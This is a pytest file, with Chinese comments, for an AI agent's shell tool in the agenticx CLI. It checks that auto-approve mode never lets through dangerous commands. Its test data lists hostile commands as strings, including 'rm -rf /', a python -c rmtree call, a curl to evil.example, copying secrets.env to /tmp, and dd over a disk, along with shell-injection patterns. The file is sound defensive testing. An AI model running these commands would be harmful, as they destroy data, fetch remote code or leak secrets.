"""全自动模式下的召回率护栏。

产品取向是明确的：宁可多问几次，也不能漏掉一次真正危险的操作。所以这里只测一个
方向——**危险命令必须被拦下**。精度（会不会问得太勤）不在本文件的断言范围内。

拦截分两道：
1. 命令名不在 SAFE_COMMANDS → risk=non_whitelisted
2. 命令名在白名单里，但参数危险（`python -c`、`pip install`、`git reset --hard`…）
   → risk=high

第 2 道最容易被无声地拆掉：往 SAFE_COMMANDS 里加个名字是一行改动，看着人畜无害，
实际会让这个名字下的所有参数组合直接放行。所以这里按「完整命令」而不是「命令名」
断言。
"""

from __future__ import annotations

import re
from typing import List

import pytest

from agenticx.cli.agent_tools import (
    SAFE_COMMANDS,
    _collect_subcommand_risk_reasons,
    _extract_python_script_arg,
)
from agenticx.runtime.confirm import is_protected_confirm, normalize_confirm_risk


def _classify(command: str) -> str:
    """复刻 _tool_bash_exec 的两道判定，返回最终 risk 标签（"" = 直接放行）。"""
    parts = command.split()
    command_name = parts[0] if parts else ""

    if command_name not in SAFE_COMMANDS:
        return "non_whitelisted"

    reasons: List[str] = list(_collect_subcommand_risk_reasons(command_name, parts))
    if command_name == "python" and _extract_python_script_arg(parts):
        reasons.append("python script execution")
    if re.search(r"(;|&&|\|\||\||`|\$\(|>|<|\n)", command):
        reasons.append("suspicious shell metacharacters")
    if command_name == "rm" and any(
        flag in {"-rf", "-fr", "-r", "-R", "-f", "--no-preserve-root"} for flag in parts[1:]
    ):
        reasons.append("destructive rm flags")
    if command_name == "git":
        if len(parts) >= 3 and parts[1] == "reset" and parts[2] == "--hard":
            reasons.append("destructive git reset --hard")
        if len(parts) >= 2 and parts[1] == "clean" and any(f.startswith("-f") for f in parts[2:]):
            reasons.append("destructive git clean")
        if len(parts) >= 2 and parts[1] == "push" and any("--force" in f for f in parts[2:]):
            reasons.append("force push")
    if command_name in {"dd", "mkfs", "shutdown", "reboot", "poweroff"}:
        reasons.append("high-risk system command")

    return "high" if reasons else ""


DANGEROUS = [
    # 白名单里的名字 + 危险参数：最容易被误以为安全的一类
    "python -c __import__('shutil').rmtree('/Users/me/work')",
    "python -m http.server",
    "python cleanup.py",
    "pip install requests",
    "pip uninstall agenticx",
    "git reset --hard HEAD~5",
    "git clean -fdx",
    "git push --force origin main",
    "git checkout other-branch",
    "cat secrets.env > /tmp/leak.txt",
    "echo bad; rm -rf /tmp/x",
    "ls `whoami`",
    "grep -r . $(pwd)",
    # 名字本身就不在白名单
    "rm -rf /",
    "curl http://evil.example/x.sh",
    "chmod 777 /etc/passwd",
    "dd if=/dev/zero of=/dev/disk0",
    "shutdown -h now",
    "brew install something",
    "npm install -g pkg",
    "ssh user@host",
    "sudo rm file",
]


@pytest.mark.parametrize("command", DANGEROUS)
def test_dangerous_commands_are_never_auto_approved(command: str) -> None:
    risk = _classify(command)
    assert risk != "", f"{command!r} 会被直接放行——白名单或参数判定漏了一条"
    assert is_protected_confirm({"risk": risk}), f"{command!r} 判成了 risk={risk}，不受保护"


def test_unknown_risk_is_protected_not_approved() -> None:
    """新加工具忘了打 risk 标签时，必须落到「问」而不是「放行」。"""
    assert is_protected_confirm({})
    assert is_protected_confirm({"tool": "some_new_tool"})
    assert is_protected_confirm({"risk": "medium"})       # 拼错/新增的档
    assert is_protected_confirm({"risk": "LOW "}) is False  # 只有确实是 low 才放行
    assert normalize_confirm_risk({"risk": None}) == "protected"


def test_read_only_commands_still_flow_without_a_prompt() -> None:
    """召回优先不等于把一切都拦下——常见只读命令仍应直接执行，否则自动模式没有意义。"""
    for command in ["ls -la", "cat README.md", "git status", "git log --oneline", "pwd", "which python"]:
        assert _classify(command) == "", f"{command!r} 被拦了，自动模式会变得没法用"
